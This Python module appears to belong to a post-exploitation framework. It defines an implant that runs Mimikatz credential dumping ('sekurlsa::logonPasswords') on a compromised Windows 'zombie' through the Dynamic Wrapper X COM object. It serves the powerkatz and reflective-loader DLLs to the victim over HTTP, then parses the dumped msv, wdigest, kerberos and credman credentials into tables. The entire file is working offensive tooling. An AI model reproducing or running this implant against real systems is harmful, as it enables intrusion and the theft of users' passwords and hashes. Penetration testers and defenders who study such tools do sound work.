import core.implant
import core.job
import string
import collections
import tabulate

class DynWrapXShellcodeJob(core.job.Job):
    def create(self):
        self.fork32Bit = True

    def parse_mimikatz(self, data):
        full_data = data
        data = data.split("mimikatz(powershell) # ")[1]
        if "token::elevate" in data and "Impersonated !" in data:
            self.print_good("token::elevate -> got SYSTEM!")
            return

        if "privilege::debug" in data and "OK" in data:
            self.print_good("privilege::debug -> got SeDebugPrivilege!")
            return

        if "ERROR kuhl_m_" in data:
            self.error("0", data.split("; ")[1].split(" (")[0], "Error", data)
            self.errstat = 1
            return

        if "Authentication Id :" in data:
            from tabulate import tabulate
            tabulate.PRESERVE_WHITESPACE = False
            self.errstat = 0
            nice_data = data.split('\n\n')
            msv_all = []
            tspkg_all = []
            wdigest_all = []
            kerberos_all = []
            ssp_all = []
            credman_all = []
            for section in nice_data:
                if 'Authentication Id' in section:
                    msv = collections.OrderedDict()
                    tspkg = collections.OrderedDict()
                    wdigest = collections.OrderedDict()
                    kerberos = collections.OrderedDict()
                    ssp = collections.OrderedDict()
                    credman = collections.OrderedDict()

                    msv_sec = section.split("msv :\t")[1].split("\ttspkg :")[0].splitlines()
                    for line in msv_sec:
                        if '\t *' in line:
                            msv[line.split("* ")[1].split(":")[0].rstrip()] = line.split(": ")[1].split("\n")[0]
                    if msv:
                        msv_all.append(msv)

                    tspkg_sec = section.split("tspkg :\t")[1].split("\twdigest :")[0].splitlines()
                    for line in tspkg_sec:
                        if '\t *' in line:
                            tspkg[line.split("* ")[1].split(":")[0].rstrip()] = line.split(": ")[1].split("\n")[0]
                    if tspkg:
                        tspkg_all.append(tspkg)

                    wdigest_sec = section.split("wdigest :\t")[1].split("\tkerberos :")[0].splitlines()
                    for line in wdigest_sec:
                        if '\t *' in line:
                            wdigest[line.split("* ")[1].split(":")[0].rstrip()] = line.split(": ")[1].split("\n")[0]
                    if wdigest:
                        wdigest_all.append(wdigest)

                    kerberos_sec = section.split("kerberos :\t")[1].split("\tssp :")[0].splitlines()
                    for line in kerberos_sec:
                        if '\t *' in line:
                            kerberos[line.split("* ")[1].split(":")[0].rstrip()] = line.split(": ")[1].split("\n")[0]
                    if kerberos:
                        kerberos_all.append(kerberos)

                    ssp_sec = section.split("ssp :\t")[1].split("\tcredman :")[0].splitlines()
                    for line in ssp_sec:
                        if '\t *' in line:
                            ssp[line.split("* ")[1].split(":")[0].rstrip()] = line.split(": ")[1].split("\n")[0]
                    if ssp:
                        ssp_all.append(ssp)

                    credman_sec = section.split("credman :\t")[1].splitlines()
                    for line in credman_sec:
                        if '\t *' in line:
                            credman[line.split("* ")[1].split(":")[0].rstrip()] = line.split(": ")[1].split("\n")[0]
                    if credman:
                        credman_all.append(credman)

            msv_all = [collections.OrderedDict(t) for t in set([tuple(d.items()) for d in msv_all])]
            tspkg_all = [collections.OrderedDict(t) for t in set([tuple(d.items()) for d in tspkg_all])]
            wdigest_all = [collections.OrderedDict(t) for t in set([tuple(d.items()) for d in wdigest_all])]
            kerberos_all = [collections.OrderedDict(t) for t in set([tuple(d.items()) for d in kerberos_all])]
            ssp_all = [collections.OrderedDict(t) for t in set([tuple(d.items()) for d in ssp_all])]
            credman_all = [collections.OrderedDict(t) for t in set([tuple(d.items()) for d in credman_all])]

            parsed_data = "Results\n\n"

            if msv_all:
                msv_all = sorted(msv_all, key=lambda k: k['Username'])
                parsed_data += "msv credentials\n===============\n\n"
                parsed_data += tabulate(msv_all, headers="keys")
                parsed_data += "\n\n"

            if tspkg_all:
                tspkg_all = sorted(tspkg_all, key=lambda k: k['Username'])
                parsed_data += "tspkg credentials\n=================\n\n"
                parsed_data += tabulate(tspkg_all, headers="keys")
                parsed_data += "\n\n"

            if wdigest_all:
                wdigest_all = sorted(wdigest_all, key=lambda k: k['Username'])
                parsed_data += "wdigest credentials\n===================\n\n"
                parsed_data += tabulate(wdigest_all, headers="keys")
                parsed_data += "\n\n"

            if kerberos_all:
                kerberos_all = sorted(kerberos_all, key=lambda k: k['Username' ])
                parsed_data += "kerberos credentials\n====================\n\n"
                parsed_data += tabulate(kerberos_all, headers="keys")
                parsed_data += "\n\n"

            if ssp_all:
                ssp_all = sorted(ssp_all, key=lambda k: k['Username'])
                parsed_data += "ssp credentials\n===============\n\n"
                parsed_data += tabulate(ssp_all, headers="keys")
                parsed_data += "\n\n"

            if credman_all:
                credman_all = sorted(credman_all, key=lambda k: k['Username'])
                parsed_data += "credman credentials\n===================\n\n"
                parsed_data += tabulate(credman_all, headers="keys")
                parsed_data += "\n\n"

            # if msv_all:
            #     print(tabulate(msv_all, headers="keys"))

            self.mimi_output = parsed_data


    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("DLLUUID"):
            handler.send_file(self.options.get("DYNWRAPXDLL"))
            return

        if task == self.options.get("MANIFESTUUID"):
            handler.send_file(self.options.get("DYNWRAPXMANIFEST"))
            return

        if task == self.options.get("SHIMX64UUID"):
            handler.send_file(self.options.get("SHIMX64DLL"))

        if task == self.options.get("MIMIX64UUID"):
            handler.send_file(self.options.get("MIMIX64DLL"))

        if task == self.options.get("MIMIX86UUID"):
            handler.send_file(self.options.get("MIMIX86DLL"))

        if len(data) == 0:
            handler.reply(200)
            return

        if "mimikatz(powershell) # " in data:
            self.parse_mimikatz(data)
            handler.reply(200)
            return

        if data == "Complete" and self.errstat != 1:
            super(DynWrapXShellcodeJob, self).report(handler, data)

        handler.reply(200)

    def done(self):
        self.display()

    def display(self):
        try:
            self.print_good(self.mimi_output)
        except:
            pass

class DynWrapXShellcodeImplant(core.implant.Implant):

    NAME = "Shellcode via Dynamic Wrapper X"
    DESCRIPTION = "Executes arbitrary shellcode using the Dynamic Wrapper X COM object"
    AUTHORS = ["zerosum0x0", "Aleph-Naught-" "gentilwiki"]

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

        self.options.register("MIMICMD", "sekurlsa::logonPasswords", "What Mimikatz command to run?", required=True)

        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "relative path to powerkatz64.dll", required=True, advanced=True)

        self.options.register("DYNWRAPXDLL", "data/bin/dynwrapx.dll", "relative path to dynwrapx.dll", required=True, advanced=True)
        self.options.register("DYNWRAPXMANIFEST", "data/bin/dynwrapx.manifest", "relative path to dynwrapx.manifest", required=True, advanced=True)

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)

        self.options.register("DLLUUID", "", "HTTP header for UUID", hidden=True)
        self.options.register("MANIFESTUUID", "", "UUID", hidden=True)
        self.options.register("SHIMX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX86UUID", "", "UUID", hidden=True)

        self.options.register("SHIMX86BYTES", "", "calculated bytes for arr_DLL", hidden=True)

        self.options.register("SHIMX86OFFSET", "6217", "Offset to the reflective loader", advanced = True)

    def make_arrDLL(self, path):
        import struct
        count = 0
        ret = ""
        with open(path, 'rb') as fileobj:
            for chunk in iter(lambda: fileobj.read(4), ''):
                if len(chunk) != 4:
                    break
                integer_value = struct.unpack('<I', chunk)[0]
                ret += hex(integer_value).rstrip("L") + ","
                if count % 20 == 0:
                    ret += "\r\n"

                count += 1

        return ret[:-1] # strip last comma

    def run(self):

        import uuid
        self.options.set("DLLUUID", uuid.uuid4().hex)
        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX86UUID", uuid.uuid4().hex)


        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))


        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dynwrapx.js", self.options)

        self.dispatch(workloads, DynWrapXShellcodeJob)
